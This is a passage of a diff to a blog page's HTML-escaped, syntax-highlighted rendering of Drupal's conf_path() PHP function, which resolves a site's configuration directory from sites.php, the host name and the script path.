class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/default&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;pre&gt;&lt;code&gt;  &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;amp;&amp;amp;amp;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;!&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$reset&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;c1&quot;&amp;gt;//&amp;amp;lt;-- here is the run-only-once thing I was talking about&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;sites&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$sites&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;k&quot;&amp;gt;array&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;();&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nb&quot;&amp;gt;file_exists&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/sites.php&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;c1&quot;&amp;gt;// This will overwrite $sites with the desired mappings.&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;k&quot;&amp;gt;include&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/sites.php&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;);&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$uri&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;explode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$_SERVER&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;SCRIPT_NAME&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;]&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;?&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$_SERVER&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;SCRIPT_NAME&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;]&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;:&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$_SERVER&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;SCRIPT_FILENAME&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;]);&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$server&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;explode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;.&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;implode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;.&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;array_reverse&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nb&quot;&amp;gt;explode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;:&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;rtrim&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$_SERVER&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;HTTP_HOST&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;],&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;.&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)))));&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;k&quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$i&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;count&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$uri&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;-&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;1&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$i&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$i&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;--&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;k&quot;&amp;gt;for&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$j&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;count&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$server&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;);&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$j&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$j&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;--&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;implode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;.&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;array_slice&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$server&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;-&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$j&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;implode&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;.&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;array_slice&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$uri&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;mi&quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;,&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$i&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;));&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nb&quot;&amp;gt;isset&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$sites&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;])&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;amp;&amp;amp;amp;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;file_exists&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$sites&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;]))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$sites&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;[&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;];&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;k&quot;&amp;gt;if&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nb&quot;&amp;gt;file_exists&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/settings.php&amp;amp;#39;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;||&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;o&quot;&amp;gt;!&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nv&quot;&amp;gt;$require_settings&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;&amp;amp;amp;&amp;amp;amp;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nb&quot;&amp;gt;file_exists&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;(&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;nx&quot;&amp;gt;DRUPAL_ROOT&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s1&quot;&amp;gt;&amp;amp;#39;/&amp;amp;#39;&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;.&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$dir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;)))&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;p&quot;&amp;gt;{&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s2&quot;&amp;gt;&amp;amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;si&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s2&quot;&amp;gt;/&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;si&quot;&amp;gt;$dir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s2&quot;&amp;gt;&amp;amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-        &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-      &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-    &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;o&quot;&amp;gt;=&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;s2&quot;&amp;gt;&amp;amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;si&quot;&amp;gt;$confdir&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;s2&quot;&amp;gt;/default&amp;amp;quot;&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-  &amp;lt;span class=&quot;k&quot;&amp;gt;return&amp;lt;/span&amp;gt; &amp;lt;span class=&quot;nv&quot;&amp;gt;$conf&amp;lt;/span&amp;gt;&amp;lt;span class=&quot;p&quot;&amp;gt;;&amp;lt;/span&amp;gt;
-&amp;lt;span class=&quot;p&quot;&amp;gt;}&amp;lt;/span&amp;gt;&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;&amp;lt;/figure&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
 
